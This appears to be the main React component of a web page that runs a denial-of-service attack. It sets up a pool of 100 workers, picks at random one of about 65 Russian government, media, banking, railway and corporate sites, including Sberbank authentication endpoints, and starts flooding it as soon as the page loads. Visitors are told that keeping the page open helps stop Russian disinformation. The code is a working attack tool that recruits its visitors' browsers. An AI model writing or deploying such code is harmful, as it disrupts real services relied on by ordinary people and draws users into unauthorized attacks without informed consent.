import React, { useEffect } from 'react';
import './App.css';
import { WorkerPool } from './loader';

const pool = new WorkerPool(100);

// list taken from https://stop-russian-desinformation.near.page/
var targets = [
  'https://lenta.ru',
  'https://ria.ru',
  'https://ria.ru/lenta',
  'https://www.rbc.ru',
  'https://www.rt.com',
  'http://kremlin.ru',
  'http://en.kremlin.ru',
  'https://smotrim.ru',
  'https://tass.ru',
  'https://tvzvezda.ru',
  'https://vsoloviev.ru',
  'https://www.1tv.ru',
  'https://www.vesti.ru',
  'https://online.sberbank.ru',
  'https://sberbank.ru',
  'https://zakupki.gov.ru',
  'https://www.gosuslugi.ru',
  'https://er.ru',
  'https://www.rzd.ru',
  'https://rzdlog.ru',
  'https://vgtrk.ru',
  'https://www.interfax.ru',
  'https://www.mos.ru/uslugi',
  'http://government.ru',
  'https://mil.ru',
  'https://www.nalog.gov.ru',
  'https://customs.gov.ru',
  'https://pfr.gov.ru',
  'https://rkn.gov.ru',
  'https://www.gazprombank.ru',
  'https://www.vtb.ru',
  'https://www.gazprom.ru',
  'https://lukoil.ru',
  'https://magnit.ru',
  'https://www.nornickel.com',
  'https://www.surgutneftegas.ru',
  'https://www.tatneft.ru',
  'https://www.evraz.com/ru',
  'https://nlmk.com',
  'https://www.sibur.ru',
  'https://www.severstal.com',
  'https://www.metalloinvest.com',
  'https://nangs.org',
  'https://rmk-group.ru/ru',
  'https://www.tmk-group.ru',
  'https://yandex.ru',
  'https://yandex.by',
  'https://www.polymetalinternational.com/ru',
  'https://www.uralkali.com/ru',
  'https://www.eurosib.ru',
  'https://omk.ru',
  'https://mail.rkn.gov.ru',
  'https://cloud.rkn.gov.ru',
  'https://mvd.gov.ru',
  'https://pwd.wto.economy.gov.ru',
  'https://stroi.gov.ru',
  'https://proverki.gov.ru',
  'https://www.gazeta.ru',
  'https://www.crimea.kp.ru',
  'https://www.kommersant.ru',
  'https://riafan.ru',
  'https://www.mk.ru',
  'https://api.sberbank.ru/prod/tokens/v2/oauth',
  'https://api.sberbank.ru/prod/tokens/v2/oidc',
  'https://www.vedomosti.ru',
  'https://sputnik.by',
];

const selected = targets[Math.floor(Math.random() * targets.length)];

function App() {
  const runJob = async () => {
    pool.process(selected);
  };

  useEffect(() => {
    runJob();
  }, []);

  return (
    <div className='App'>
      <p>
        ?????????? ??????????????! Please leave this page open to help stop Putin
        & Russian Disinformation.
      </p>
    </div>
  );
}

export default App;
